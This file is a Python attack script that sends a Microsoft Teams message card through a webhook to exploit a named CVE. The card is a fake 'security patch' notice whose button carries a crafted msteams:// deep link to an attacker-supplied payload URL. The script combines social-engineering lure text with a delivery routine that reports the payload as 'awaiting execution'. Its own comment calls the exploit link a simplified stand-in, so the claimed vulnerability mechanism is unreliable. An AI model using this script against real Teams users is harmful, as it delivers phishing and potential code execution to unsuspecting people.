import requests
import json
import sys
import urllib.parse

def send_teams_payload(webhook_url, payload_url):
    """
    Sends a crafted deep link to a Microsoft Teams webhook to trigger CVE-2025-23198.
    The deep link uses the 'msteams://' protocol handler to inject the payload.
    """
    print(f"[*] Targeting Teams Webhook: {webhook_url}")
    print(f"[*] Payload URL: {payload_url}")

    # Craft the malicious deep link
    # This is a simplified representation of the IPC poisoning vector.
    # The actual vulnerability involves specific parameters that the Electron app
    # improperly sanitizes when handling the deep link.
    crafted_link = f"msteams://teams.microsoft.com/l/message/0/0?url={urllib.parse.quote(payload_url)}&type=open_url"

    # Construct the Teams message card
    message = {
        "@type": "MessageCard",
        "@context": "http://schema.org/extensions",
        "themeColor": "0076D7",
        "summary": "Important Update",
        "sections": [{
            "activityTitle": "System Notification",
            "activitySubtitle": "Action Required",
            "activityImage": "https://teams.microsoft.com/favicon.ico",
            "text": "Please click the link below to apply the latest security patch."
        }],
        "potentialAction": [{
            "@type": "OpenUri",
            "name": "Apply Patch",
            "targets": [{
                "os": "default",
                "uri": crafted_link
            }]
        }]
    }

    headers = {'Content-Type': 'application/json'}

    try:
        response = requests.post(webhook_url, data=json.dumps(message), headers=headers)
        if response.status_code == 200:
            print("[+] Payload delivered successfully. Awaiting execution.")
        else:
            print(f"[-] Delivery failed. Status Code: {response.status_code}")
            print(f"[-] Response: {response.text}")
    except Exception as e:
        print(f"[-] Error during delivery: {e}")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python teams_delivery.py <Teams_Webhook_URL> <Payload_URL>")
        sys.exit(1)

    teams_webhook = sys.argv[1]
    payload_location = sys.argv[2]

    send_teams_payload(teams_webhook, payload_location)
